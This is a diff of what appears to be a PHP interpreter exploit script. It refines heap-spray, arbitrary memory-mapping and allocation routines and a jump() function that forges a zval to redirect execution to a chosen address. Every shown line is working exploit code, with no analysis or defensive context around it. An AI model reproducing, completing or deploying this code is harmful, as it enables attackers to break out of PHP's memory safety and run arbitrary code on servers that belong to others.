@@ -51,7 +51,7 @@ function map($addr,$sz) {
 	return [&$x[0]];
 }
 $n=[];
-for($a=0;$a<0x100;$a++) $n[]=str_repeat("AXBX", 0x1000);
+for($a=0;$a<0x100;$a++) $n[]=str_repeat("AXBX", 0x2000);
 
 function mapheap() {
 	global $c;global $pt;global $n;
@@ -63,21 +63,23 @@ function mapheap() {
 		if($n[$zz][0]=="O")
 			nogc([&$n[$zz]]);
 	}
+
 	$pt=$ptx+$z;
 	$c=0;
 }
 
 function alloc($sz) {
 	global $c;global $pt;
-if(!isset($pt)) {
-mapheap();
-}
-	if($c+$sz > 0x4000) return 0;
+	if(!isset($pt)) {
+		mapheap();
+	}
+	$c += 0x10 - (($pt+$c) & 0xF);
+	if($c+$sz > 0x8000) return 0;
 	$ret=[];
 	$ret['ptr'] = $pt+$c;
 	$ret['val'] = &map($pt+$c, $sz)[0];
-memcpy($ret, str_repeat("o", $sz), $sz);
-	$c+=$sz+0x4;
+	memcpy($ret, str_repeat(".", $sz), $sz);
+	$c+=$sz;
 	return $ret;
 }
 
@@ -88,14 +90,16 @@ function shiftalloc($alloc, $ptr) {
 	return $ret;
 }
 
-function memcpy($out, $in, $sz) {
+function memcpy($out, $in) {
+	$sz=strlen($in);
 	for($i=0;$i<$sz;$i++) {
 		$out['val'][$i] = $in[$i];
 	}
 }
 
-function jump($addr,$rax,$raxlen) { 
-	$al = shiftalloc(alloc(16+1020+$raxlen),1020);
+function jump($addr,$rax) { 
+	$raxlen = strlen($rax);
+	$al = shiftalloc(alloc(1024+$raxlen+16),1024);
 	memcpy($al, $rax, $raxlen);
 	memcpy($al, ibuf(0,8).ibuf($addr,8), 16);
 	$zv = zval(0, $al['ptr'], 5, 0);
